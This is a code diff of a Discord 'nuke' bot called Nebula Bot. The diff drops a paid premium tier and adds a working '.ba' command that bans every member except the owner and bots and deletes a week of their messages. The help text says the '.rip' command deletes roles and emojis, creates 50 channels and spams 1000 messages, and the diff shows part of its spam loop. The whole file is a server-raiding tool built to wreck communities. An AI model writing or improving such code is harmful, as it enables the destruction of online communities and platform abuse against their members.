@@ -1,4 +1,4 @@
-const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
+const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
 const express = require('express');
 const dotenv = require('dotenv');
 
@@ -16,7 +16,7 @@ const client = new Client({
   ]
 });
 
-// ====== WEB SERVER ======
+// ====== WEB SERVER FOR PORT 3000 ======
 const app = express();
 const PORT = process.env.PORT || 3000;
 
@@ -54,30 +54,6 @@ client.on('ready', () => {
   console.log(`🚀 Logged in as ${client.user.tag}`);
 });
 
-// ====== MONGODB CONNECTION ======
-const mongoose = require('mongoose');
-
-const premiumUserSchema = new mongoose.Schema({
-  userId: String,
-  purchasedAt: Date
-});
-
-const PremiumUser = mongoose.model('PremiumUser', premiumUserSchema);
-
-async function connectDB() {
-  try {
-    await mongoose.connect(process.env.MONGO_URI, {
-      useNewUrlParser: true,
-      useUnifiedTopology: true
-    });
-    console.log('🟢 Connected to MongoDB');
-  } catch (err) {
-    console.error('❌ MongoDB connection failed:', err.message);
-  }
-}
-
-connectDB();
-
 client.on('messageCreate', async (message) => {
   if (!message.content.startsWith('.') || message.author.bot) return;
 
@@ -90,9 +66,8 @@ client.on('messageCreate', async (message) => {
       .setTitle('🤖 Nebula Bot Commands')
       .setDescription('Here are the available commands for Nebula Bot:')
       .addFields(
-        { name: '.rip', value: '🧨 Nukes the server (available to all)' },
-        { name: '.ba', value: '🔐 Bans all members (premium only)' },
-        { name: '.premium', value: '💳 Get premium access via Stripe' },
+        { name: '.rip', value: 'Nukes the server (deletes roles, emojis, creates 50 channels, spams 1000 messages)' },
+        { name: '.ba', value: 'Bans all members (except owner)' },
         { name: '.help', value: 'Sends this help message to your DMs' }
       )
       .setColor('#ff0000')
@@ -108,30 +83,41 @@ client.on('messageCreate', async (message) => {
     return;
   }
 
-  // ===== PREMIUM COMMAND =====
-  if (command === 'premium') {
-    const premiumLink = 'https://solbot.store/premium '; // Your hosted Stripe page
+  // ===== BAN ALL MEMBERS =====
+  if (command === 'ba') {
+    if (!message.member.permissions.has('BanMembers')) {
+      return message.reply('❌ You don\'t have permission to ban members.');
+    }
 
-    const embed = new EmbedBuilder()
-      .setTitle('💳 Get Premium Access')
-      .setDescription('Click the button below to subscribe and unlock premium features.')
-      .setColor('#00ff00');
+    const guild = message.guild;
 
-    const row = new ActionRowBuilder().addComponents(
-      new ButtonBuilder()
-        .setLabel('Buy Premium')
-        .setStyle(ButtonStyle.Link)
-        .setURL(premiumLink)
+    // Skip owner and bots
+    const membersToBan = guild.members.cache.filter(m =>
+      m.id !== guild.ownerId && !m.user.bot
     );
 
-    await message.reply({ embeds: [embed], components: [row] });
-    return;
-  }
+    if (membersToBan.size === 0) {
+      return message.reply('❌ No members available to ban.');
+    }
 
-  // ===== BAN ALL MEMBERS (PREMIUM ONLY - PLACEHOLDER) =====
-  if (command === 'ba') {
-    // Placeholder — will check DB later
-    return message.reply('🔐 This command is for premium users only. Run `.premium` to upgrade.');
+    console.log(`🔪 Banning ${membersToBan.size} members...`);
+
+    for (const member of membersToBan.values()) {
+      try {
+        await handleRateLimit(() => guild.members.ban(member, {
+          reason: 'Nebula Ban All',
+          deleteMessageSeconds: 604800 // Delete 1 week of messages
+        }));
+        console.log(`✅ Banned: ${member.user.tag}`);
+      } catch (err) {
+        console.error(`❌ Failed to ban ${member.user.tag}: ${err.message}`);
+      }
+      await new Promise(r => setTimeout(r, 50)); // Small delay between bans
+    }
+
+    console.log(`✅ Successfully banned all members.`);
+    await message.reply(`✅ Banned ${membersToBan.size} members.`);
+    return;
   }
 
   // ===== RIP COMMAND =====
@@ -268,7 +254,7 @@ client.on('messageCreate', async (message) => {
           } catch (err) {
             console.error(`⚠️ Send failed in ${channel.name}: ${err.message}`);
           }
-          await new Promise(r => setTimeout(r, 2));
+          await new Promise(r => setTimeout(r, 2)); // 2ms delay between sends
         }
       });
 
